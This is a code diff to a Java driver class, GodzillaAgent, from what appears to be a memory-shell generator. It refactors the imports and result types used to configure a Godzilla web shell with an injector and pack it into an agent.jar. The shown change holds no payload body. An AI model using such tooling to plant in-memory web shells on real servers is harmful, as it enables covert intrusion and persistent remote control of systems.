@@ -1,11 +1,15 @@
 package com.reajason.javaweb;
 
-import com.reajason.javaweb.memshell.*;
-import com.reajason.javaweb.memshell.config.GenerateResult;
+import com.reajason.javaweb.memshell.MemShellGenerator;
+import com.reajason.javaweb.memshell.MemShellResult;
+import com.reajason.javaweb.memshell.ShellTool;
+import com.reajason.javaweb.memshell.ShellType;
 import com.reajason.javaweb.memshell.config.GodzillaConfig;
 import com.reajason.javaweb.memshell.config.InjectorConfig;
 import com.reajason.javaweb.memshell.config.ShellConfig;
-import com.reajason.javaweb.memshell.packer.jar.JarPacker;
+import com.reajason.javaweb.packer.Packers;
+import com.reajason.javaweb.packer.jar.JarPacker;
+import com.sun.security.ntlm.Server;
 
 import java.nio.file.Files;
 import java.nio.file.Paths;
@@ -38,7 +42,7 @@ public class GodzillaAgent {
 //                .headerValue("test")
                 .build();
 
-        GenerateResult result = MemShellGenerator.generate(shellConfig, injectorConfig, godzillaConfig);
+        MemShellResult result = MemShellGenerator.generate(shellConfig, injectorConfig, godzillaConfig);
 
         System.out.println("注入器类名：" + result.getInjectorClassName());
         System.out.println("内存马类名：" + result.getShellClassName());
@@ -46,7 +50,7 @@ public class GodzillaAgent {
         System.out.println(result.getShellConfig());
         System.out.println(result.getShellToolConfig());
 
-        byte[] agentJarBytes = ((JarPacker) Packers.AgentJar.getInstance()).packBytes(result);
+        byte[] agentJarBytes = ((JarPacker) Packers.AgentJar.getInstance()).packBytes(result.toJarPackerConfig());
         Files.write(Paths.get("agent.jar"), agentJarBytes);
     }
 }
